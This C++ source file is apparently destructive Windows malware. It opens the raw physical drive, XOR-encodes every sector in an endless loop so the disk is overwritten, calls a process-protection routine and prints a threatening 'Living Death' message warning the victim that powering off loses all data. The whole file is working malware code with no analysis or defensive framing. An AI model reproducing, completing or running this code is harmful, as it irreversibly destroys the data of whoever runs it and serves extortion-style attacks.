#include <Windows.h>
#include <iostream>
#include "protect.h"

void ENCODE();
int main()
{
	protectProcess();
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ENCODE, NULL, 0, NULL);
	printf("\n\n\n\n\n\n\n\n\n\n			   I am the Living Death.\n");
	printf("\n		       I am coding your hard disk now.\n");
	printf("	     Your NTFS is destroyed and his copy is only in memory.\n");
	printf ("	      If you set power off, all your data will be lost !!\n");
	getchar();
	
}
void ENCODE() {
	DWORD wb;
	char sector[1024000];

	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	SetFilePointer(drive, 0,0, FILE_BEGIN);

	for (;;) {
    
	ReadFile(drive, sector, 1024000, &wb, NULL);
	for (int i = 0; i < 1024000; i++)sector[i] ^= 0x2E;

	LARGE_INTEGER move;
	move.QuadPart = -1024000;

	SetFilePointerEx(drive, move,0, FILE_CURRENT);
	WriteFile(drive, sector, 1024000, &wb, NULL);
	}
}